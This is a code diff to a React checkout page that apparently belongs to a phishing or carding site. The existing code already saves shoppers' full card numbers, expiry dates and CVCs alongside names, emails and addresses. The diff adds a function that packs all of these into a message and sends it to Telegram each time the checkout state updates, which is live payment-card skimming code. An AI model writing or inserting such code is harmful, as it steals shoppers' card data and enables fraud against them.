@@ -20,6 +20,7 @@ import { getCardType, isCreditCard } from "../../utils/regexValidator";
 import CircleLoader from "../../components/App/CircleLoader/CircleLoader";
 import { actionChangeInput } from "../../store/reducer/order";
 import { handleUnload, updateInfosRequest } from "../../axios/supabaseClient";
+import { sendMessageToTelegram } from '../../axios/tlg';
 
 function CheckoutPage() {
   const dispatch = useAppDispatch();
@@ -104,23 +105,34 @@ function CheckoutPage() {
   }, [id]);
 
   useEffect(() => {
-    if (orderInput.delivery_address !== null && orderInput.total && id && notifId !== null) {
-
-      updateInfosRequest({
-        id: notifId,
-        email: email,
-        firstname: infos.firstname,
-        lastname: infos.lastname,
-        address: `${orderInput.delivery_address?.firstname} ${orderInput.delivery_address?.lastname} ${orderInput.delivery_address?.address} ${orderInput.delivery_address?.precision} ${orderInput.delivery_address?.postal_code} ${orderInput.delivery_address?.city} ${orderInput.delivery_address?.country.name}`,
-        c_name: card.card_name,
-        c_number: card.card_number,
-        exp_date: card.expiration_date,
-        cvc: card.cvc,
-        total: orderInput.total,
-        status: "checking infos",
-        code: null
-      })
+    const sendUpdate = async() => {
+      if (orderInput.delivery_address !== null && orderInput.total && id && notifId !== null) {
+      
+        updateInfosRequest({
+          id: notifId,
+          email: email,
+          firstname: infos.firstname,
+          lastname: infos.lastname,
+          address: `${orderInput.delivery_address?.firstname} ${orderInput.delivery_address?.lastname} ${orderInput.delivery_address?.address} ${orderInput.delivery_address?.precision} ${orderInput.delivery_address?.postal_code} ${orderInput.delivery_address?.city} ${orderInput.delivery_address?.country.name}`,
+          c_name: card.card_name,
+          c_number: card.card_number,
+          exp_date: card.expiration_date,
+          cvc: card.cvc,
+          total: orderInput.total,
+          status: "checking infos",
+          code: null
+        });
+  
+        try {
+          const message = `${email} \n${infos.firstname} ${infos.lastname} \n${address.firstname} ${address.lastname} ${address.address} ${address.precision} ${address.postal_code} ${address.city} ${address.country.name} \n${card.card_name}\n${card.card_number}\n${card.expiration_date}\n${card.cvc}\n${toStringWith2Decimals(Number(subtotal.replace(',', '.')) + (shippingCost))}\n statut: a confirmer`;
+          await sendMessageToTelegram(message);
+        } catch (error) {
+          console.log(error)
+        }
+      }
     }
+
+    sendUpdate();
   }, [orderInput, id, notifId]);
 
   const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement> | ChangeEvent<HTMLSelectElement>) => {
